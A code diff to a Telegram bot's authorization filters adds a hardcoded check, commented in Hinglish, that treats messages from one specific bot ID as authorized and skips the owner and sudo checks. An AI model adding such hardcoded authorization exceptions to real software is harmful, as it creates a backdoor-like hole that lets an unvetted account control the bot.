@@ -1,8 +1,6 @@
 from pyrogram.filters import create
-
 from ... import user_data, auth_chats, sudo_users
 from ...core.config_manager import Config
-
 
 class CustomFilters:
     async def owner_filter(self, _, update):
@@ -12,10 +10,22 @@ class CustomFilters:
     owner = create(owner_filter)
 
     async def authorized_user(self, _, update):
+        # --- YAHAN BADLAV KIYA GAYA HAI ---
+        # Sabse pehle, check karo ki message kisi bot se hai ya nahi
+        # aur uski ID 7117359127 hai
+        if hasattr(update, 'from_user') and update.from_user and update.from_user.is_bot:
+            # Agar bot hai, to check karo ki uski ID hamare special bot ki ID hai ya nahi
+            if update.from_user.id == 7117359127:
+                # Agar ID match hoti hai, to command ko allow karo
+                return True
+        # --- BADLAV YAHAN KHATAM ---
+
         user = update.from_user or update.sender_chat
         uid = user.id
         chat_id = update.chat.id
         thread_id = update.message_thread_id if update.topic_message else None
+        
+        # Baaki users ke liye purana logic vaise hi chalega
         return bool(
             uid == Config.OWNER_ID
             or (
@@ -57,3 +67,4 @@ class CustomFilters:
         )
 
     sudo = create(sudo_user)
+
